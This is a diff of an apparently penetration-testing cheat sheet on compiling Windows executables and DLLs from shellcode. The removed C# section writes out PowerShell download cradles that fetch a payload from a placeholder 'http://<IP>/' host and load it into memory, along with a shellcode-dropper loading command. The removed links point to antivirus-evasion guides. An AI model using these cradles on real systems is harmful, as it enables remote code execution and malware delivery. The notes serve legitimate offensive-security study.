@@ -1,5 +1,7 @@
 # Windows
 
+Search Tag(s): #command-line #compiler #windows
+
 ## 01 - MASM
 
 ```
@@ -16,13 +18,15 @@ C:\> objcopy -O binary shell.exe shell.bin
 
 - Compile Windows binaries in Linux
 
-`$ i686-w64-mingw32-gcc shellcode.c -o shell.exe`
+```
+$ i686-w64-mingw32-gcc shellcode.c -o shell.exe
 
-`$ x86_64-w64-mingw32-gcc shellcode.c -o shell.exe`
+$ x86_64-w64-mingw32-gcc shellcode.c -o shell.exe
 
-`$ clang -target x86_64-pc-windows-gnu shell.c -o shell.exe`
+$ clang -target x86_64-pc-windows-gnu shell.c -o shell.exe
 
-`$ zig cc --target=x86_64-windows-gnu -static shell.c -o shell.exe`
+$ zig cc --target=x86_64-windows-gnu -static shell.c -o shell.exe
+```
 
 - Compile Windows binaries in Linux with icons
 
@@ -34,9 +38,11 @@ $ x86_64-w64-mingw32-gcc -o shell.exe resource.o shell.c
 
 - Compile Windows Dynamic Linked Library in Linux
 
-`$ i686-w64-mingw32-gcc shellcode.c -shared -o shell-x86.dll`
+```
+$ i686-w64-mingw32-gcc shellcode.c -shared -o shell-x86.dll
 
-`$ x86_64-w64-mingw32-gcc shellcode.c -shared -o shell-x86_64.dll`
+$ x86_64-w64-mingw32-gcc shellcode.c -shared -o shell-x86_64.dll
+```
 
 ### 2.2 - CL
 
@@ -96,71 +102,6 @@ C:\> cl.exe /nologo /0x /W0 /GS- /DNDEBUG /Tcshell.c /link /out:shell.exe /subsy
 
 `C:\> cl.exe /nologo /0x /W0 /GS- /DNDEBUG /Tpshell.cpp /link /out:shell.exe /subsystem:console /machine:x64`
 
-## 04 - C\#
-
-- Create .NET Console Project
-
-`C:\> dotnet new console`
-
-- Compile C# Project of Windows executable
-
-`C:\> dotnet publish -r win-x64 -c Release -p:PublishSingleFile=true --sc false -p:PublishTrimmed=true`
-
-`C:\> dotnet publish -r win10-x64 -c Release -p:PublishSingleFile=true --sc false -p:PublishTrimmed=true`
-
-`C:\> dotnet publish -f net6.0 -r win-x64 -c Release -p:PublishSingleFile=true --sc false -p:PublishTrimmed=true`
-
-Or you can just use `build`
-
-`C:\> dotnet build -r win-x64 -c Release -p:PublishSingleFile=true -p:PublishTrimmed=true`
-
-`C:\> dotnet build -r win-x64 -c Release -p:PublishSingleFile=true -p:AllowUnsafeBlocks=true -p:PublishTrimmed=true`
-
-`$ cat download-cradle-exe.ps1`
-
----
-
-```powershell
-$data = (New-Object Net.WebClient).DownloadData("http://<IP>/Shellcode.exe")
-$assem = [System.Reflection.Assembly]::Load($data)
-[Shell.Program()]::Main()
-# [Program()]::Main()
-# [Shell.Program()]::Main("".Split())
-```
-
-- **Compile C# DLL**
-
-`C:\> dotnet new classlib`
-
-`C:\> dotnet publish -r win-x64 -c Release --sc false -p:PublishTrimmed=true`
-
-`C:\> dotnet build -r win-x64 -c Release --sc false -p:PublishTrimmed=true`
-
-Allow unsafe code
-
-`C:\> dotnet publish -r win-x64 -c Release -p:AllowUnsafeBlocks=true --sc false -p:PublishTrimmed=true`
-
-`C:\> dotnet build -c Release -p:AllowUnsafeBlocks=true --sc false -p:PublishTrimmed=true`
-
-Execute Shellcode
-
-```
-PS C:\> [System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("DLLDropper.dll")
-PS C:\> [RunDLLPublicFunc.Class1]::runner()
-```
-
-`$ cat download-cradle-dll.ps1`
-
----
-
-```powershell
-$data = (New-Object Net.WebClient).DownloadData("http://<IP>/Shellcode.dll")
-$assembly = [System.Reflection.Assembly]::Load($data)
-$class = $assembly.GetType("Shellcode.Class1")
-$method = $class.GetMethod("<method_name>")
-$method.Invoke(0, $null)
-```
-
 ---
 ## References
 
@@ -169,11 +110,3 @@ $method.Invoke(0, $null)
 - [Quickpost Compiling EXEs and Resources with Mingw on Kali](https://blog.didierstevens.com/2018/09/17/quickpost-compiling-exes-and-resources-with-mingw-on-kali/)
 
 - [Zig C Compiler Powerful Drop in Replacment GCC Clang](https://andrewkelley.me/post/zig-cc-powerful-drop-in-replacement-gcc-clang.html)
-
-- [Purpl3f0xsecur1ty.tech AV Evasion.html](https://www.purpl3f0xsecur1ty.tech/2021/03/30/av_evasion.html)
-
-- [https://medium.com/@carlosprincipal1/how-to-bypass-antivirus-av-2020-easy-method-69749892928b](https://medium.com/@carlosprincipal1/how-to-bypass-antivirus-av-2020-easy-method-69749892928b)
-
-- [In3x0rabl3: OSEP](https://github.com/In3x0rabl3/OSEP)
-
-- [https://dotnet.microsoft.com/en-us/download/dotnet-framework/net481](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net481)
